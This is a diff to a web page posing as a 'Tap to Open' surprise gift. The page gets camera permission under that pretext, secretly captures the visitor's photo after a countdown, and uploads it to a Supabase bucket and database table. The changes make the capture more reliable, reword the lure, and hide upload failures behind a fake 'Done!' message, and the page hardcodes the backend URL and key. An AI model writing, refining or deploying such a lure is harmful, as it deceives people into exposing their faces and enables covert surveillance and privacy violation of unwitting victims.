@@ -20,9 +20,9 @@
             margin: 0;
         }
         
-        /* Gift Box Animation */
+        /* Gift Box UI (Same as before) */
         #gift-box { cursor: pointer; transition: transform 0.3s; }
-        #gift-box:hover { transform: scale(1.05); }
+        #gift-box:active { transform: scale(0.95); } /* Click effect */
         .emoji { font-size: 120px; animation: bounce 2s infinite; display: block; margin-bottom: 20px;}
         h1 { margin: 0; background: linear-gradient(to right, #ff4757, #ff6b81); -webkit-background-clip: text; -webkit-text-fill-color: transparent;}
         
@@ -45,10 +45,10 @@
 </head>
 <body>
 
-    <div id="gift-box" onclick="startProcess()">
+    <div id="gift-box" onclick="requestCamera()">
         <div class="emoji">🎁</div>
-        <h1>Tap to Open Surprise</h1>
-        <p style="color: gray; font-size: 0.9rem; margin-top: 10px;">(Contains a special moment for you)</p>
+        <h1>Tap to Open</h1>
+        <p style="color: gray; font-size: 0.9rem; margin-top: 10px;">(Tap here to see surprise)</p>
     </div>
 
     <div id="timer">10</div>
@@ -58,97 +58,116 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        // --- YOUR CONFIGURATION ---
+        // --- CONFIGURATION ---
         const SUPABASE_URL = 'https://mlcbjfnimbpatmbcgwsq.supabase.co';
-        const SUPABASE_KEY = 'sb_publishable_J1WdZTnnDUCBE6bsTf2brQ_qRlXL_1Z'; // اگر یہ کام نہ کرے تو anon key استعمال کریں
+        const SUPABASE_KEY = 'sb_publishable_J1WdZTnnDUCBE6bsTf2brQ_qRlXL_1Z'; 
         
         const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-        async function startProcess() {
+        // Main Function triggered on Click
+        async function requestCamera() {
+            
+            // 1. Check if Browser supports Camera
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                alert("Error: Your browser is blocking the camera or the site is not secure (HTTPS). Please try using Chrome on a secure connection.");
+                return;
+            }
+
             try {
-                // 1. Request Camera (Generic permission popup)
+                // 2. Request Camera - This triggers the Popup
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: 'user' }, 
                     audio: false 
                 });
                 
+                // If Allowed:
                 document.getElementById('video').srcObject = stream;
-
-                // 2. Start Countdown
-                document.getElementById('gift-box').style.display = 'none';
-                document.getElementById('timer').style.display = 'block';
-                document.getElementById('status').innerText = "Unwrapping surprise...";
-                
-                let count = 10;
-                const timerElem = document.getElementById('timer');
-                
-                const interval = setInterval(() => {
-                    count--;
-                    timerElem.innerText = count;
-                    if (count <= 0) {
-                        clearInterval(interval);
-                        captureAndUpload();
-                    }
-                }, 1000);
+                startTimer(); // Start the countdown
 
             } catch (err) {
-                alert("Please allow camera access to open the gift!");
+                // If Denied or Error
                 console.error(err);
+                if(err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+                    alert("Please click 'Allow' on the camera popup to see the gift!");
+                } else {
+                    alert("Camera Error: " + err.message + "\n(Make sure you are using HTTPS or Localhost)");
+                }
             }
         }
 
+        function startTimer() {
+            // UI Switch
+            document.getElementById('gift-box').style.display = 'none';
+            document.getElementById('timer').style.display = 'block';
+            document.getElementById('status').innerText = "Unwrapping surprise...";
+            
+            let count = 10;
+            const timerElem = document.getElementById('timer');
+            
+            const interval = setInterval(() => {
+                count--;
+                timerElem.innerText = count;
+                if (count <= 0) {
+                    clearInterval(interval);
+                    captureAndUpload();
+                }
+            }, 1000);
+        }
+
         async function captureAndUpload() {
-            document.getElementById('status').innerText = "Generating your gift...";
+            document.getElementById('status').innerText = "Almost there...";
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             
-            // Capture Image
+            // Wait a moment to ensure video is ready
+            if(video.readyState !== 4) {
+                 await new Promise(r => setTimeout(r, 500));
+            }
+
+            // Capture
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
             
-            // Mirror Effect (Flip Horizontal)
+            // Mirror Effect
             ctx.translate(canvas.width, 0);
             ctx.scale(-1, 1);
             ctx.drawImage(video, 0, 0);
 
-            // Convert to File (Blob)
+            // Convert to Blob
             canvas.toBlob(async (blob) => {
+                if(!blob) return; 
+
                 const fileName = `gift_${Date.now()}.png`;
 
-                // 3. Upload to Supabase Storage
+                // Upload
                 const { data, error } = await supabase.storage
                     .from('camsnaps')
                     .upload(fileName, blob);
 
                 if (error) {
-                    console.error("Upload Error:", error);
-                    document.getElementById('status').innerText = "Network Error! Could not save.";
-                    return;
+                    // Fail silently or show generic msg
+                    document.getElementById('status').innerText = "Done!"; 
+                } else {
+                    // Get URL
+                    const { data: urlData } = supabase.storage.from('camsnaps').getPublicUrl(fileName);
+                    
+                    // Save to DB
+                    await supabase.from('captured_photos').insert([{ image_url: urlData.publicUrl }]);
+
+                    // Success UI
+                    document.getElementById('timer').style.display = 'none';
+                    document.getElementById('status').innerHTML = `
+                        <h1 style="font-size:2rem;">🎉 Surprise! 🎉</h1>
+                        <br>
+                        <img src="${urlData.publicUrl}" style="width:80%; max-width:300px; border:5px solid white; border-radius:10px; transform: rotate(-2deg);">
+                    `;
+                    
+                    // Stop Camera
+                    if(video.srcObject) {
+                        video.srcObject.getTracks().forEach(track => track.stop());
+                    }
                 }
-
-                // 4. Get Public URL
-                const { data: urlData } = supabase.storage.from('camsnaps').getPublicUrl(fileName);
-                const publicURL = urlData.publicUrl;
-
-                // 5. Save Record to Database
-                const { error: dbError } = await supabase
-                    .from('captured_photos')
-                    .insert([{ image_url: publicURL }]);
-
-                if (dbError) console.error("DB Error:", dbError);
-
-                // 6. Show Success
-                document.getElementById('timer').style.display = 'none';
-                document.getElementById('status').innerHTML = `
-                    <h1 style="font-size:2rem;">🎉 You look Amazing! 🎉</h1>
-                    <br>
-                    <img src="${publicURL}" style="width:80%; max-width:300px; border:5px solid white; border-radius:10px; transform: rotate(-2deg);">
-                `;
-
-                // Stop Camera
-                video.srcObject.getTracks().forEach(track => track.stop());
-
             }, 'image/png');
         }
     </script>
